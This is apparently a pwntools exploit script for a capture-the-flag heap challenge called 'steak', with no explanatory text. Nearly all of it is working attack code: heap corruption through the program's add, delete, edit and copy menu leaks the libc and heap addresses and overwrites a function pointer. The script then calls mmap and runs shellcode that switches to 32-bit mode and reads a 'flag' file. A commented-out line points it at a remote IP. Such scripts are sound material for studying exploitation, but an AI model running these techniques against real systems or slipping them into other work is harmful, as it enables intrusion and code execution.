#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

# Settings
context.terminal = ['tmux', 'splitw', '-h']
context.os = 'linux'
context.arch = 'amd64'

# Global
PROG = "./steak"
LIBC = "./libc-2.23.so"
elf = ELF(PROG)
libc = ELF(LIBC)
#io = remote("192.168.210.11", 11006)
#io = process(PROG)
io = process("./steak")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (addr))

def add(size, buf):
    io.recvuntil('4.copy')
    io.sendline('1')
    io.recvuntil('input buf size:')
    io.sendline(str(size))
    io.recvuntil('input buf:')
    io.send(buf)

def delete(idx):
    io.recvuntil('4.copy')
    io.sendline('2')
    io.recvuntil('input index')
    io.sendline(str(idx))

def edit(idx, size, buf):
    io.recvuntil('4.copy')
    io.sendline('3')
    io.recvuntil('input index')
    io.sendline(str(idx))
    io.recvuntil('input size:')
    io.sendline(str(size))
    io.recvuntil('input new buf:')
    io.send(buf)

def copy(src, dst, size):
    io.recvuntil('4.copy')
    io.sendline('4')
    io.recvuntil('input source index:')
    io.sendline(str(src))
    io.recvuntil('input dest index:')
    io.sendline(str(dst))
    io.recvuntil('input copy length:')
    io.sendline(str(size))

add(0x10, '0'*0x10)
add(0x10, '1'*0x10)
add(0x200, '2'*0x200)
add(0x50, '3'*0x50)
delete(3)
edit(3, 0x8, p64(0x41))
add(0x50, '4'*0x50)

add(0x30, '5'*0x30)
delete(5)

#delete(0)
delete(1)
delete(0)
delete(2)
copy(2, 5, 0x8)
edit(5, 2, '\x40')
add(0x30, '6'*0x30)
add(0x30, '\0'*0x28+p64(0xdeadbeefdeadbeef))

copy(1, 7, 0x30)
edit(7, 0x2a, '\0'*0x28+p16(0x2c50))
add(0x3e0, '\0'*0x3e0)
add(0x3e0, '\0'*0x3e0)
add(0x370, '\0'*0x368+p64(0x4006E8))

# leak
delete(2)
io.recvuntil(':\n')
libc_base = u64(io.recv(6).ljust(0x8, '\0'))-0x3c4c08-0x70-0x100
log.info('0x%016x' % libc_base)
delete(0)
io.recvuntil(':\n')
heap_base = u64(io.recv(3).ljust(0x8, '\0'))-0x20
log.info('0x%016x' % heap_base)

edit(10, 0x370, '\0'*0x368+p64(libc_base+0x47b7c))
#attach(libc_base+0x47b7c)
payload  = ''
payload += 'a'*0x28
payload += p64(0x0) # r8
payload += p64(0x0) # r9
payload  = payload.ljust(0x68, 'a')
payload += p64(heap_base) # rdi
payload += p64(0x1000) # rsi
payload  = payload.ljust(0x88, 'a')
payload += p64(0x7) # rdx
payload  = payload.ljust(0x98, 'a')
payload += p64(0x32) # rcx
payload  = payload.ljust(0xa8, 'a')
payload += p64(libc_base+libc.symbols['mmap']) # ret

shellcode  = asm(shellcraft.mmap(0x800000, 0x1000, 7, 34, -1, 0))
shellcode += asm(shellcraft.mmap(0xa00000, 0x1000, 7, 34, -1, 0))
shellcode += asm(shellcraft.read(0, 0x800000, 0x1000))
shellcode += asm("""
        mov    rsp, 0xa00800
        mov    DWORD PTR [esp+0x4],0x23
        mov    DWORD PTR [esp],0x800000
        retf
""")

edit(2, len(payload), payload)
delete(2)
edit(0, len(shellcode), shellcode)
edit(10, 0x370, '\0'*0x368+p64(heap_base+0x10))
#	attach(0x603010)
delete(0)

sc32 = '\x0c$hflag\x89\xe31\xc91\xd2j\x05X\xcd\x80'
sc32+= 'j\x03[\xb9\xff\xff_\xff\xf7\xd1j Zj\x03X\xcd\x80'
sc32+= 'j\x01[\xb9\xff\xff_\xff\xf7\xd1j Zj\x04X\xcd\x80'
io.sendline(sc32)

io.interactive()
